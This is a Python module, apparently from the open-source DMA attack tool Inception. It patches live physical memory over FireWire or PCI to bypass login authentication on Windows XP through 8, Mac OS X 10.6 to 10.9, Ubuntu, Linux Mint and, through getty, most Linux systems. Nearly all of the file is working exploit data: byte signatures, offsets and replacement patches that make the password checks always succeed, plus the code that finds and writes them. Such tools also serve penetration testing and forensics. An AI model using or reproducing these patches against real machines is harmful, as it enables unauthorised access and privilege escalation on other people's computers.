'''
Inception - a FireWire physical memory manipulation and hacking tool exploiting
PCI-based and IEEE 1394 SBP-2 DMA.

Copyright (C) 2011-2014  Carsten Maartmann-Moe

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

Created on Jun 23, 2011

@author: Carsten Maartmann-Moe <carsten@carmaa.com> aka ntropy
'''
import sys

from inception import cfg, terminal
from inception.memory import Target, Signature, Chunk
from inception.exceptions import InceptionException

IS_INTRUSIVE = True

term = terminal.Terminal()

info = 'Unlocks the target\'s screensaver or lock screen. After running ' \
       'this module you should be able to log in with any non-blank password.'

# Target template
# Target(
#     name=None,
#     note=None,
#     signatures=[
#         Signature(
#             os=None,
#             os_versions=[],
#             os_architectures=['x86', 'x64'],
#             executable=None,
#             version=None,
#             md5=None,
#             tag=False,
#             offsets=[],
#             chunks=[
#                 Chunk(
#                     chunk=None,
#                     chunkoffset=0x00,
#                     patch=None,
#                     patchoffset=0x00)
#                 ]
#             )
#         ]
#     )


targets = [
    Target(
        name='Windows 8 MsvpPasswordValidate unlock/privilege escalation',
        note='Ensures that the password-check always returns true. This will '
        'cause all accounts to no longer require a password, and will '
        'also allow you to escalate privileges to Administrator via the '
        '\'runas\' command.',
        signatures=[
            Signature(
                os='Windows 8',
                os_versions=['8.0'],
                os_architectures=['x86'],
                executable='msv1_0.dll',
                version=None,
                md5=None,
                tag=False,
                offsets=[0xde7],
                chunks=[
                    Chunk(
                        chunk=0x8bff558bec81ec90000000a1,
                        chunkoffset=0x00,
                        patch=0xb001,
                        patchoffset=0xc1)
                    ]
                ),
            Signature(
                os='Windows 8',
                os_versions=['8.1'],
                os_architectures=['x86'],
                executable='msv1_0.dll',
                version=None,
                md5=None,
                tag=False,
                offsets=[0xca0],
                chunks=[
                    Chunk(
                        chunk=0x8bff558bec81ec90000000a1,
                        chunkoffset=0x00,
                        patch=0x909090909090,
                        patchoffset=0xb3)
                    ]
                ),
            Signature(
                os='Windows 8',
                os_versions=['8.0', '8.1'],
                os_architectures=['x64'],
                executable='msv1_0.dll',
                version=None,
                md5=None,
                tag=False,
                offsets=[0x208, 0xd78],
                chunks=[
                    Chunk(
                        chunk=0xc60f85,
                        chunkoffset=0x00,
                        patch=0x909090909090,
                        patchoffset=0x01),
                    Chunk(
                        chunk=0x66b80100,
                        chunkoffset=0x07,
                        patch=None,
                        patchoffset=0x00)
                    ]
                )
            ]
        ),
    Target(
        name='Windows 7 MsvpPasswordValidate unlock/privilege escalation',
        note='NOPs out the jump that is called if passwords doesn\'t match. '
        'This will cause all accounts to no longer require a password, '
        'and will also allow you to escalate privileges to Administrator '
        'via the \'runas\' command. Note: As the Windows stores the '
        'LANMAN/NTLM hash of the entered password, the account will be '
        'locked out of any Windows AD domain he/she was member of at '
        'this machine.',
        signatures=[
            Signature(
                os='Windows 7',
                os_versions=['SP0', 'SP1'],
                os_architectures=['x64'],
                executable='msv1_0.dll',
                version=None,
                md5=None,
                tag=False,
                offsets=[0x2a8, 0x2a1, 0x291, 0x321, 0xe59],
                chunks=[
                    Chunk(
                        chunk=0xc60f85,
                        chunkoffset=0x00,
                        patch=0x909090909090,
                        patchoffset=0x01),
                    Chunk(
                        chunk=0xb8,
                        chunkoffset=0x07,
                        patch=None,
                        patchoffset=0x00)
                    ]
                ),
            Signature(
                os='Windows 7',
                os_versions=['SP0'],
                os_architectures=['x86'],
                executable='msv1_0.dll',
                version=None,
                md5=None,
                tag=False,
                offsets=[0x926],
                chunks=[
                    Chunk(
                        chunk=0x83f8107513b0018b,
                        chunkoffset=0x00,
                        patch=0x83f8109090b0018b,
                        patchoffset=0x00)
                    ]
                ),
            Signature(
                os='Windows 7',
                os_versions=['SP1'],
                os_architectures=['x86'],
                executable='msv1_0.dll',
                version=None,
                md5=None,
                tag=False,
                offsets=[0x312, 0x6aa],
                chunks=[
                    Chunk(
                        chunk=0x83f8100f85,
                        chunkoffset=0x00,
                        patch=0x83f810909090909090b0018b,
                        patchoffset=0x00),
                    Chunk(
                        chunk=0xb0018b,
                        chunkoffset=0x09,
                        patch=None,
                        patchoffset=0x00),
                    ]
                )
            ]
        ),
    Target(
        name='Windows Vista MsvpPasswordValidate unlock/privilege escalation',
        note='NOPs out the jump that is called if passwords doesn\'t match. '
        'This will cause all accounts to no longer require a password, '
        'and will also allow you to escalate privileges to Administrator '
        'via the \'runas\' command. Note: As the patch stores the '
        'LANMAN/NTLM hash of the entered password, the account will be '
        'locked out of any Windows AD domain he/she was member of at '
        'this machine.',
        signatures=[
            Signature(
                os='Windows Vista',
                os_versions=['SP2'],
                os_architectures=['x64'],
                executable='msv1_0.dll',
                version=None,
                md5=None,
                tag=False,
                offsets=[0x1a1],
                chunks=[
                    Chunk(
                        chunk=0xc60f85,
                        chunkoffset=0x00,
                        patch=0x909090909090,
                        patchoffset=0x01),
                    Chunk(
                        chunk=0xb8,
                        chunkoffset=0x07,
                        patch=None,
                        patchoffset=0x00)
                    ]
                ),
            Signature(
                os='Windows Vista',
                os_versions=['SP0', 'SP1', 'SP2'],
                os_architectures=['x86'],
                executable='msv1_0.dll',
                version=None,
                md5=None,
                tag=False,
                offsets=[0x432, 0x80f, 0x74a],
                chunks=[
                    Chunk(
                        chunk=0x83f8107513b0018b,
                        chunkoffset=0x00,
                        patch=0x83f8109090b0018b,
                        patchoffset=0x00)
                    ]
                )
            ]
        ),
    Target(
        name='Windows XP MsvpPasswordValidate unlock/privilege escalation',
        note='NOPs out the jump that is called if passwords doesn\'t match. '
        'This will cause all accounts to no longer require a password, '
        'and will also allow you to escalate privileges to Administrator '
        'via the \'runas\' command. Note: As the patch stores the '
        'LANMAN/NTLM hash of the entered password, the account will be '
        'locked out of any Windows AD domain he/she was member of at '
        'this machine.',
        signatures=[
            Signature(
                offsets=[0x862, 0x8aa, 0x946, 0x126, 0x9b6],
                os='Windows XP',
                os_versions=['SP2', 'SP3'],
                os_architectures=['x86'],
                executable='msv1_0.dll',
                version=None,
                md5=None,
                tag=False,
                chunks=[
                    Chunk(
                        chunk=0x83f8107511b0018b,
                        chunkoffset=0x00,
                        patch=0x83f8109090b0018b,
                        patchoffset=0x00)
                    ]
                )
            ]
        ),
    Target(
        name='Mac OS X DirectoryService/OpenDirectory unlock/privilege '
        'escalation',
        note='Overwrites the DoShadowHashAuth/ODRecordVerifyPassword return '
        'value. After running, all local authentications (e.g., GUI, sudo, '
        'etc.) will work with all non-blank passwords',
        signatures=[
            Signature(
                os='Mac OS X',
                os_versions=['10.6.4'],
                os_architectures=['x64'],
                executable=None,
                version=None,
                md5=None,
                tag=False,
                offsets=[0x7cf],
                chunks=[
                    Chunk(
                        chunk=0x41bff6c8ffff48c78588,
                        chunkoffset=0x00,
                        patch=0x41bf0000000048c78588,
                        patchoffset=0x00)
                    ]
                ),
            Signature(
                os='Mac OS X',
                os_versions=['10.6.8'],
                os_architectures=['x64'],
                executable=None,
                version=None,
                md5=None,
                tag=False,
                offsets=[0xbff],
                chunks=[
                    Chunk(
                        chunk=0x41bff6c8ffff,
                        chunkoffset=0x00,
                        patch=0x41bf00000000,
                        patchoffset=0x00)
                    ]
                ),
            Signature(
                os='Mac OS X',
                os_versions=['10.6.8'],
                os_architectures=['x86'],
                executable=None,
                version=None,
                md5=None,
                tag=False,
                offsets=[0x82f],
                chunks=[
                    Chunk(
                        chunk=0xc78580f6fffff6c8ffff,
                        chunkoffset=0x00,
                        patch=0xc78580f6ffff00000000,
                        patchoffset=0x00)
                    ]
                ),
            Signature(
                os='Mac OS X',
                os_versions=['10.7.3'],
                os_architectures=['x64'],
                executable=None,
                version=None,
                md5=None,
                tag=False,
                offsets=[0xfa7],
                chunks=[
                    Chunk(
                        chunk=0x0fb6,
                        chunkoffset=0x00,
                        patch=0x31dbffc3,  # xor ebx,ebx; inc ebx;
                        patchoffset=0x00),
                    Chunk(
                        chunk=0x89d8eb0231c04883c4785b415c415d415e415f5dc3,
                        chunkoffset=0x0e,
                        patch=None,
                        patchoffset=0x00)
                    ]
                ),
            Signature(
                os='Mac OS X',
                os_versions=['10.8.2', '10.8.3', '10.8.4'],
                os_architectures=['x64'],
                executable=None,
                version=None,
                md5=None,
                tag=False,
                offsets=[0x334],
                chunks=[
                    Chunk(
                        chunk=0x88d84883c4685b415c415d415e415f5d,
                        chunkoffset=0x00,
                        patch=0xb001,  # mov al,1;
                        patchoffset=0x00)
                    ]
                ),
            Signature(
                os='Mac OS X',
                os_versions=['10.9'],
                os_architectures=['x64'],
                executable='CFOpenDirectory',
                version=None,
                md5=None,
                tag=False,
                offsets=[0x1e5],
                chunks=[
                    Chunk(
                        chunk=0x4488e84883c4685b415c415d415e415f5d,
                        chunkoffset=0x00,
                        patch=0x90b001,  # nop; mov al,1;
                        patchoffset=0x00)
                    ]
                )
            ]
        ),
    Target(
        name='Ubuntu libpam unlock/privilege escalation',
        note='Overwrites the pam_authenticate return value. After running, '
        'all PAM-based authentications (e.g., GUI, tty and sudo) will work '
        'with no password.',
        signatures=[
            Signature(
                os='Ubuntu',
                os_versions=['10.04', '10.10', '11.10', '11.04', '12.04'],
                os_architectures=['x86'],
                executable=None,
                version=None,
                md5=None,
                tag=False,
                offsets=[0xa6d, 0xebd, 0x9ed, 0xbaf, 0xa7f],
                chunks=[
                    Chunk(
                        chunk=0x83f81f89c774,
                        chunkoffset=0x00,
                        patch=0xbf00000000eb,
                        patchoffset=0x00)
                    ]
                ),
            Signature(
                os='Ubuntu',
                os_versions=['12.10', '13.04', '13.10'],
                os_architectures=['x86'],
                executable=None,
                version=None,
                md5=None,
                tag=False,
                offsets=[0xb46, 0xcae, 0xc95],
                chunks=[
                    Chunk(
                        chunk=0xe8,
                        chunkoffset=0x00,
                        patch=None,
                        patchoffset=0x00),
                    Chunk(
                        chunk=0x83f81f,
                        chunkoffset=0x05,
                        patch=0x9031c0,  # nop; xor eax,eax
                        patchoffset=0x00)
                    ]
                ),
            Signature(
                os='Ubuntu',
                os_versions=['11.10', '11.04', '12.04'],
                os_architectures=['x64'],
                executable=None,
                version=None,
                md5=None,
                tag=False,
                offsets=[0x838, 0x5b8, 0x3c8],
                chunks=[
                    Chunk(
                        chunk=0x83f81f89c574,
                        chunkoffset=0x00,
                        patch=0xbd00000000eb,
                        patchoffset=0x00)
                    ]
                ),
            Signature(
                os='Ubuntu',
                os_versions=['12.10', '13.04', '13.10'],
                os_architectures=['x64'],
                executable=None,
                version=None,
                md5=None,
                tag=False,
                offsets=[0x4aa, 0x69b, 0x688],
                chunks=[
                    Chunk(
                        chunk=0xe8,
                        chunkoffset=0x00,
                        patch=None,
                        patchoffset=0x00),
                    Chunk(
                        chunk=0x83f81f,
                        chunkoffset=0x05,
                        patch=0x6631c0,  # xor eax,eax
                        patchoffset=0x00)
                    ]
                )
            ]
        ),
    Target(
        name='Linux Mint libpam unlock/privilege escalation',
        note='Overwrites the pam_authenticate return value. After running, '
        'all PAM-based authentications (e.g., GUI, tty and sudo) will work '
        'with no password.',
        signatures=[
            Signature(
                os='Linux Mint',
                os_versions=['11', '12', '13'],
                os_architectures=['x86'],
                executable=None,
                version=None,
                md5=None,
                tag=False,
                offsets=[0xebd, 0xbaf, 0xa7f],
                chunks=[
                    Chunk(
                        chunk=0x83f81f89c774,
                        chunkoffset=0x00,
                        patch=0xbf00000000eb,
                        patchoffset=0x00)
                    ]
                ),
            Signature(
                os='Linux Mint',
                os_versions=['11', '12', '13'],
                os_architectures=['x64'],
                executable=None,
                version=None,
                md5=None,
                tag=False,
                offsets=[0x838, 0x5b8, 0x3c8],
                chunks=[
                    Chunk(
                        chunk=0x83f81f89c574,
                        chunkoffset=0x00,
                        patch=0xbd00000000eb,
                        patchoffset=0x00)
                    ]
                )
            ]
        ),
    Target(
     name='Generic Linux Getty preauthenticated patch',
     note='The last command parameter to getty "--" is preventing commmand injection in the shell.'
     ' This can be replace to "-f" which results in the user beeing preauthenticated.'
     ' Getty is used to login on a text console on most Linux systems. GDM, KDM or pam is not affected.'
     ' When the patch is applied, switch to a text console (on most ditros using Ctrl+Alt+F2) and login without requiring a password.'
     ' If you want to target another Linux system; dump the memory, use a hex editor to search for the chunk and'
     ' enter the pageoffset in the offset field below and rerun inception.',
     signatures=[
         Signature(
             os='Linux',
             os_versions=['Most'],
             os_architectures=['x86', 'x64'],
             executable=None,
             version=None,
             md5=None,
             tag=True,
             offsets=[0x892],
             chunks=[
                 Chunk(
                     chunk=0x2d2d0025733a206361,
                     chunkoffset=0x00,
                     patch=0x66,
                     patchoffset=0x01)
                 ]
             )
         ]
     )
    ]


def add_options(parser):
    parser.add_option('-l', '--list',
                      action='callback',
                      callback=list_targets,
                      help='list available targets (operating systems).')
    parser.add_option('-t', '--target-number',
                      dest='target_number',
                      help='specify a target number.')
    parser.add_option('-p', '--payload',
                      dest='payload_filename',
                      help='specify a file that contains a binary payload to '
                           'patch with instead of the signature patch.')
    parser.add_option('-r', '--revert',
                      action='store_true',
                      dest='revert',
                      help='revert patch after use.')
    parser.add_option('--dry-run',
                      action='store_true',
                      dest='dry_run',
                      help='dry run, do not write back to memory.')


def select_target(targets, selected=False):
    '''
    Provides easy selection of targets. Input is a list of targets (dicts)
    '''
    if len(targets) == 1:
        term.info('Only one target present, auto-selected')
        return targets[0]
    if not selected:
        selected = term.poll('Please select target (or enter \'q\' to quit):')
    nof_targets = len(targets)
    try:
        selected = int(selected)
    except:
        if selected == 'q':
            sys.exit()
        else:
            term.warn('Invalid selection, please try again. Enter \'q\' to '
                      'quit')
            return select_target(targets)
    if 0 < selected <= nof_targets:
        return targets[selected - 1]
    else:
        term.warn('Please enter a selection between 1 and {0}. Type \'q\' '
                  'to quit'.format(nof_targets))
        return select_target(targets)

    
def list_targets(*args, **kwargs):
    term.info('Available targets (known signatures):')
    print()
    for number, target in enumerate(targets, 1):
        term.info('{0}'.format(target.name), sign=number)
    # TODO: Make detailed listing of targets work: opts.verbose
    print()


def run(opts, memspace):
    '''
    Main attack logic
    '''
    if not opts.target_number:
        list_targets()
       
    # Select target, print selection
    target = select_target(targets, selected=opts.target_number)
    term.info('Selected target: ' + target.name)
    
    #  Search for the target
    address, signature, offset = memspace.find(target, verbose=opts.verbose)
    
    # Signature found, let's patch
    page = memspace.page_no(address)
    term.info('Signature found at {0:#x} in page no. {1}'
        .format(address, page))
    if not opts.dry_run:
        try:
            if opts.payload_filename:
                try:
                    payload = open(opts.payload_filename, 'rb').read()
                except Exception as e:
                    raise InceptionException(e)
                backup = memspace.write(address, payload)
            else:
                backup = memspace.patch(address, signature)
            term.info('Patch verified; successful')
        except InceptionException:
            raise

        if opts.revert:
            term.poll('Press [enter] to revert the patch:')
            memspace.write(address, backup)

            if backup == memspace.read(address, signature.length):
                term.info('Reverted patch verified; successful')
            else:
                raise InceptionException('Reverted patch could not be '
                                         'verified')

    return address, page
